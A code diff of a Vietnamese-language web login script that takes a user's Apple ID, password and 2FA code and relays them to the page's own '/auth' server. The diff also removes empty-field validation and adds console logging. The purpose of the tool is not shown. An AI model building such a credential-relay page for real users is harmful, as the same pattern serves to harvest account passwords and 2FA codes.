@@ -116,7 +116,6 @@ document.addEventListener('DOMContentLoaded', () => {
     e.preventDefault();
     if (isLoading) return;
     
-    debugLog('=== BẮT ĐẦU ĐĂNG NHẬP ===');
     hideError();
     setLoading(true);
     setProgress(1);
@@ -124,65 +123,45 @@ document.addEventListener('DOMContentLoaded', () => {
     const APPLE_ID = elements.appleIdInput.value.trim();
     const PASSWORD = elements.passwordInput.value;
 
-    if (!APPLE_ID || !PASSWORD) {
-      showError('Vui lòng nhập Apple ID và mật khẩu');
-      setLoading(false);
-      return;
-    }
-
-    state.APPLE_ID = APPLE_ID;
-    state.PASSWORD = PASSWORD;
-
     try {
-      debugLog(`Gửi yêu cầu đăng nhập cho: ${APPLE_ID}`);
-      const response = await fetch('/auth', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ APPLE_ID, PASSWORD })
-      });
+        console.log('Attempting login for:', APPLE_ID);
+        const response = await fetch('/auth', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ APPLE_ID, PASSWORD })
+        });
 
-      const data = await response.json();
-      debugLog(`Phản hồi từ server: ${JSON.stringify(data)}`);
+        const data = await response.json();
+        console.log('Auth response:', data);
 
-      if (!response.ok) {
-        throw new Error(data.error || 'Lỗi từ máy chủ');
-      }
+        if (data.require2FA) {
+            state.requires2FA = true;
+            state.dsid = data.dsid;
+            elements.verifyMessage.textContent = data.message;
+            elements.step2.style.display = 'block';
+            transition(elements.step1, elements.step2);
+            setProgress(2);
+            return;
+        }
 
-      // Xử lý 2FA
-      if (data.require2FA) {
-        debugLog('Yêu cầu xác thực 2FA');
-        state.requires2FA = true;
-        state.dsid = data.dsid;
-        
-        elements.verifyMessage.textContent = data.message || 'Vui lòng nhập mã xác minh 2FA';
-        elements.step2.style.display = 'block';
-        transition(elements.step1, elements.step2);
-        setProgress(2);
-        return;
-      }
+        if (data.success) {
+            state.verified2FA = true;
+            state.dsid = data.dsid;
+            showToast('Đăng nhập thành công!');
+            transition(elements.step1, elements.step3);
+            setProgress(3);
+            return;
+        }
 
-      // Đăng nhập thành công
-      if (data.success) {
-        debugLog('Đăng nhập thành công không cần 2FA');
-        state.verified2FA = true;
-        state.dsid = data.dsid;
-        showToast('Đăng nhập thành công!');
-        transition(elements.step1, elements.step3);
-        setProgress(3);
-        return;
-      }
-
-      // Sai mật khẩu
-      showError(data.error || 'Sai tài khoản hoặc mật khẩu');
-      debugLog('Đăng nhập thất bại: Sai thông tin');
+        showError(data.error || 'Đăng nhập thất bại');
 
     } catch (error) {
-      debugLog(`Lỗi đăng nhập: ${error.message}`);
-      showError(error.message || 'Lỗi kết nối đến máy chủ');
+        console.error('Login error:', error);
+        showError('Lỗi kết nối đến máy chủ');
     } finally {
-      setLoading(false);
+        setLoading(false);
     }
-  });
+});
 
   // VERIFY 2FA HANDLER
   elements.verifyBtn.addEventListener('click', async (e) => {
